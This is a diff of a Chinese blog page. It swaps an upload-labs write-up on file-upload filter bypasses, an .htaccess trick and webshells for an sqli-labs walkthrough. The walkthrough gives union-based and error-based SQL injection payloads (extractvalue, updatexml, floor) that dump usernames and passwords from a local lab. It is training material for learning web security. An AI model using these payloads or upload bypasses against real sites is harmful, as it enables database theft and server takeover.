@@ -11,7 +11,7 @@
   
   <title>
     
-      upload-labs 
+      sqli-labs大闯关 
       
       
       |
@@ -148,19 +148,19 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">upload-labs</div>
+      <div class="post-title">sqli-labs大闯关</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2023-11-08 20:38:20
+          2023-11-26 18:06:15
         </span>
         
               <span class="post-tags">
                 <i class="iconfont icon-tags mr-10" title="Tags"></i>
                 
                 <span class="span--tag mr-8">
-                  <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
-                    #文件上传
+                  <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                    #sql注入
                   </a>
                 </span>
                 
@@ -168,27 +168,106 @@
           
       </div>
       <div class="markdown-body">
-        <h1 id="Pass-01-Pass-02"><a href="#Pass-01-Pass-02" class="headerlink" title="Pass-01 Pass-02"></a>Pass-01 Pass-02</h1><p>上传php文件说不允许上传。<br><img src="/2023/11/08/upload-labs/1.png" alt="Alt text"><br>先将php文件后缀改为jpg后缀，在上传文件时用burpsuite抓包<br><img src="/2023/11/08/upload-labs/2.png" alt="Alt text"><br>在该处再将jpg改为php，则能够成功上传，然后就可以使用webshell管理器了<br><img src="/2023/11/08/upload-labs/3.png" alt="Alt text"></p>
-<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><p><img src="/2023/11/08/upload-labs/4.png" alt="Alt text"><br>这次抓包之后改名字也不好用了，经过阅读源码之后发现作者设置了黑名单机制，即不能上传的文件中在进入数据库前对他进行审核，如果包含着这几个字符就不给移动操作，报出文件名错误的反馈。<br>我们只要不将文件名设为php即可，我们可以设为php1，phtml等。<br><img src="/2023/11/08/upload-labs/5.png" alt="Alt text"><br>这就直接上传成功了！，然后就可以美滋滋的用webshel管理器获得数据了。<br>我这出了点小问题，就是我可以发现1.php7已经被解析了，但蚁剑连接不上，冰蝎也不行，感觉可能是软件出了问题，因为我将php7改为php也没用。<br><img src="/2023/11/08/upload-labs/6.png" alt="Alt text"></p>
-<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><p>我直接上传1.php7成功了，没想到能直接上传，但也出现了和上一题一样的问题。<br>但是这题有很多屏蔽，只不过php7恰好躲过去了，可以使用上传.htaccess文件,在里面写一句话</p>
+        <h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1_1.png" alt="Alt text"><br>他让我们输入一个id<br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1_2.png" alt="Alt text"><br>输入id&#x3D;1后出现用户</p>
 <blockquote>
-<p>AddType application&#x2F;x-httpd-php .jpg</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1">http://127.0.0.1/Less-1/?id=1</a> </p>
 </blockquote>
-<p>这句话的意思是将jpg文件全部解析为php文件,所以我们只要上传一个.htaccess文件和一个经过改名为.jpg的.php文件就好了\</p>
-<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><p>好的,php7通杀了,黑名单里还是没有这个后缀.</p>
-<p>但看完网上的一些讲解之后发现我们其实可以在php后再加一个点构成</p>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1_3.png" alt="Alt text"><br>输入2-1后任没出现id&#x3D;1的用户，说明是字符型</p>
 <blockquote>
-<p>.php.</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=2-1">http://127.0.0.1/Less-1/?id=2-1</a> </p>
 </blockquote>
-<p>这样代码匹配最后一个点时,就可以把php保住了.</p>
-<p>然后我发现第三题那个问题不是文件问题,就是蚁剑他们出问题了,因为我重新做了第一题和第二题也连不上了.</p>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-4.png" alt="Alt text"><br>在1后面加’出现报错，说明是单引号闭合。可以使用#，–+来闭合后面的引号。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1">http://127.0.0.1/Less-1/?id=1</a>‘ order by 4 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-5.png" alt="Alt text"><br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-6.png" alt="Alt text"><br>使用order by 来确定字节数为3</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=1">http://127.0.0.1/Less-1/?id=1</a>‘ order by 4 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-7.png" alt="Alt text"><br>使用-1来报错，并用select 1,2,3来确定回显位</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,2,3 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-8.png" alt="Alt text"><br>使用database()爆出数据库名</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,database(),3 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-9.png" alt="Alt text"><br>在准备爆出表明时 提示说回显内容超过一行，可以使用limit来加以限制，使数据一行一行显现出来</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,(select table_name from information_schema.tables where table_schema&#x3D;database()) ,3 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-10.png" alt="Alt text"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1) ,3 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-11.png" alt="Alt text"><br>也可以使用group_concat()函数来将几个表明连接在一起，但如果限制回显字数的话，这个方法也看不到全部的数据。在其中我们看到了users这个表名。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’) ,3 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-12.png" alt="Alt text"><br>再将其列名爆出来，看到了usernmae和password</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’) ,3 –+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/1-13.png" alt="Alt text"><br>将最重要的数据爆破出来了</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-1/?id=-1">http://127.0.0.1/Less-1/?id=-1</a>‘ union select 1,(select group_concat(username,’<del>‘) from users ) ,(select group_concat(password,’</del>‘) from users ) –+</p>
+</blockquote>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/QQ%E6%88%AA%E5%9B%BE20231125110420.png" alt="Alt text"><br>输入2正常</p>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/QQ%E6%88%AA%E5%9B%BE20231125110533.png" alt="Alt text"><br>输入2-1为id&#x3D;1的画面，即该注入为数字型，不需要闭合就可以执行MySQL语句</p>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/2-3.png" alt="Alt text"><br>order by 判断行数，这几步基本一样</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-2/?id=1">http://127.0.0.1/Less-2/?id=1</a> order by 4</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/2-4.png" alt="Alt text"><br>对了，要是想显示出1，2，3需要将前面的id设为非法值。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-2/?id=-1">http://127.0.0.1/Less-2/?id=-1</a> union select 1,2,3</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/2-5.png" alt="Alt text"><br>爆出库名和表名，我感觉库名应该是不需要爆出来的，因为直接写database()就可以了</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-2/?id=-1">http://127.0.0.1/Less-2/?id=-1</a> union select 1,database(),(select  table_name from information_schema.tables where table_schema&#x3D;database() limit 2,1)</p>
+</blockquote>
+<blockquote>
+<p>…</p>
+</blockquote>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/3-1.png" alt="Alt text"><br>第三关也没什么特殊的，只需要注意下闭合方式就行了，1，2两题都是’闭合，第3题是’)闭合</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-3/?id=-1">http://127.0.0.1/Less-3/?id=-1</a>‘) union select  1,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),(select column_name from information_schema.columns where table_schema&#x3D;database() limit 8,1) –+</p>
+</blockquote>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/4-1.png" alt="Alt text"><br>闭合方式是”)</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-4/?id=-1">http://127.0.0.1/Less-4/?id=-1</a>“) union select  1,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),(select column_name from information_schema.columns where table_schema&#x3D;database() limit 8,1) –+</p>
+</blockquote>
+<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p> <img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-1.png" alt="Alt text"><br> 无回显<br> 从这里我们就需要熟悉三个函数了，使用它们来产生报错注入</p>
+<blockquote>
+<p>floor() updatexml() 和 ExtracValue()这三个函数<br>(1). 通过floor报错<br>and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)<br>其中payload为你要插入的SQL语句<br>需要注意的是该语句将 输出字符长度限制为64个字符<br>(2). 通过updatexml报错<br>and updatexml(1,payload,1)<br>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才&gt;会生效<br>(3). 通过ExtractValue报错<br>and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-2.png" alt="Alt text"><br>‘闭合</p>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-3.png" alt="Alt text"><br>闭合完成</p>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-4.png" alt="Alt text"><br>使用extractvalue(1,2)使其报错，该函数中的1,不需要管，2才是我们的报错显示的地方，其中报错符号是~，十六进制也就是0x7e，如何我们将其与数据库连接起来就可以通过报错看到库名了，我们在这里使用concat(1,2)把两者来连接在一起。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1">http://localhost/Less-5/?id=1</a>‘ union select 1,2,extractvalue(1,concat(0x7e,database()))–+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-5.png" alt="Alt text"><br>在报错注入中，显现出来的字符是有个数限制的，这时我们可以使用substring(1,2,3)来限制我们的输出内容，1这个位置是填限制的内容，2是从哪里可以是显示，3是显示多少个字符。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1">http://localhost/Less-5/?id=1</a>‘ union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,’~’,password) from users),1,30)))–+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-6.png" alt="Alt text"><br>updatexml(1,2,3)其实也是一样的，只是里面是三个参数，使用报错也都是一样的。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1">http://localhost/Less-5/?id=1</a>‘ union select 1,2,updatexml(1,concat(0x7e,database()),3)–+</p>
+</blockquote>
+<p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/5-7.png" alt="Alt text"><br>floor()比较复杂，首先需要知道count(*)是来统计个数的，这也是报错的根源，然后concat_ws(1,2,3)是用1将2和3连接在一起，1可以随便填一个符号，然后2可以是查询语句，3中使用floor(),floor中加rand(0)*2,差不多就是这样，concat_ws()之后需要分组</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/Less-5/?id=1">http://localhost/Less-5/?id=1</a>‘ union select 2,count(*),concat_ws(‘-‘,(select database()),floor(rand(0)*2)) as a from information_schema.tables group by a–+</p>
+</blockquote>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/6-1.png" alt="Alt text"><br>闭合方式改变了</p>
+<h1 id="Less-7-Less-8-基本都一样"><a href="#Less-7-Less-8-基本都一样" class="headerlink" title="Less-7 Less-8 基本都一样"></a>Less-7 Less-8 基本都一样</h1><h1 id="Less-9-Less-10"><a href="#Less-9-Less-10" class="headerlink" title="Less-9 Less-10"></a>Less-9 Less-10</h1><p>两关盲注不会<br>但我会sqlmap<br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/9-1.png" alt="Alt text"><br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/9-2.png" alt="Alt text"><br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/9-3.png" alt="Alt text"><br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/9-4.png" alt="Alt text"><br><img src="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/9-5.png" alt="Alt text"></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2023/11/08/%E5%B0%8F%E6%96%B016pro%E6%8D%A2%E7%A1%AC%E7%9B%98%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%81%87%E5%88%B0boot-failed/" target="_self">
+              <a href="/2023/11/08/upload-labs/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -197,15 +276,15 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2023-11-08 20:38:20
+              2023-11-26 18:06:15
             </span>
             
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
                     <span class="span--tag mr-8">
-                      <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">
-                        #文件上传
+                      <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                        #sql注入
                       </a>
                     </span>
                     
@@ -213,11 +292,6 @@
               
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2023/11/25/sqli-labs%E5%A4%A7%E9%97%AF%E5%85%B3/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -231,7 +305,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-01-Pass-02"><span class="toc-text">Pass-01 Pass-02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-03"><span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-04"><span class="toc-text">Pass-04</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pass-05"><span class="toc-text">Pass-05</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1"><span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-2"><span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3"><span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-4"><span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-5"><span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-6"><span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7-Less-8-%E5%9F%BA%E6%9C%AC%E9%83%BD%E4%B8%80%E6%A0%B7"><span class="toc-text">Less-7 Less-8 基本都一样</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-9-Less-10"><span class="toc-text">Less-9 Less-10</span></a></li></ol>
       
     </div>
   </div>
